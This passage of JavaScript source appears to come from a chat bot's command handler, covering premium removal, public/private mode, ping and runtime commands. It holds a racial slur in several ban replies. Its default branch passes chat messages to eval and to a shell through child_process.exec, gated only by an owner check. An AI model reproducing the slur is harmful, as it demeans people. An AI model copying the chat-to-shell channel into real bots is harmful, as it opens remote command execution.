        fs.writeFileSync('../system/premium.json', JSON.stringify(Premium));
        m.reply("Success! User removed from premium.");
    } else {
        m.reply("User is not in the premium list.");
    }
}
break;
case 'public': {
if (isban) return reply(' YOUR BANNED FROM ACCESSING THIS BOT NIGGA 🤡');
    if (!isCreator) return m.reply("```for Owner only```.");
    rich.public = true;
    m.reply("_*TG_MD  IS NOW ON PUBLIC MODE*_");
}
break;
case 'private': case 'self': {
if (isban) return reply(' YOUR BANNED FROM ACCESSING THIS BOT NIGGA 🤡');
    if (!isCreator) return m.reply("```for Owner only```.");
    rich.public = false;
    m.reply("_*TG_MD  IS NOW ON PRIVATE MODE*_");
}
break;
case 'speedtest': case 'speed': {
if (isban) return reply(' YOUR BANNED FROM ACCESSING THIS BOT NIGGA 🤡');
let timestamp = speed()
let latensi = speed() - timestamp
         reply (`━━━━━━━━━━━━━━━━━\n\◉ 𝙷𝙴𝙻𝙻𝙾 ${m.pushName}\n\━━━━━━━━━━━━━━━━━\n\◈ akane s⍴ᥱᥱძ   : ${latensi.toFixed(4)} 𝐌𝐒\n\━━━━━━━━━━━━━━━━━`); 
}
break
case 'ping': {
 if (isban) return m.reply(' YOUR BANNED FROM ACCESSING THIS  BOT NIGGA 🤡');
    const start = Date.now(); // Start time for latency calculation

    try {
        // Send initial "Pinging..." message
        let sentMessage = await rich.sendMessage(m.chat, { 
            text: 'reading...', 
            quoted: m 
        });

        // Calculate latency
        const ping = Date.now() - start;

        // Delay for a more natural feel (1.5s)
        await new Promise(resolve => setTimeout(resolve, 1500));

        // Edit the original message instead of sending a new one
        if (sentMessage?.key) { 
            await rich.sendMessage(m.chat, { 
                edit: sentMessage.key, 
                text: `\`Pong🔫\`\n *Latency:* ${ping} *ms* ` 
            });
        }
    } catch (error) {
        console.error('❌ Error in ping command:', error);
        await rich.sendMessage(m.chat, { 
            text: `❌ *Error:* ${error.message}`, 
            quoted: m 
        });
    }
    break;
}
case 'runtime': case 'alive': { 
if (isban) return reply(' YOUR BANNED FROM ACCESSING THIS BOT NIGGA 🤡');
         reply(`◈Akane md is active \n s⍴ᥱᥱძ\n : ${runtime(process.uptime())} `); 
}
break

default:
if (budy.startsWith('<')) {
if (!isCreator) return;
function Return(sul) {
sat = JSON.stringify(sul, null, 2)
bang = util.format(sat)
if (sat == undefined) {
bang = util.format(sul)}
return m.reply(bang)}
try {
m.reply(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
} catch (e) {
m.reply(String(e))}}
if (budy.startsWith('>')) {
if (!isCreator) return;
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await m.reply(evaled)
} catch (err) {
await m.reply(String(err))
}
}
if (budy.startsWith('$')) {
if (!isCreator) return;
require("child_process").exec(budy.slice(2), (err, stdout) => {
if (err) return m.reply(`${err}`)
if (stdout) return m.reply(stdout)
})
}
}
} catch (err) {
console.log(require("util").format(err));
}
}
let file = require.resolve(__filename)
require('fs').watchFile(file, () => {
require('fs').unwatchFile(file)
console.log('\x1b[0;32m'+__filename+' \x1b[1;32mupdated!\x1b[0m')
delete require.cache[file]
require(file)
})
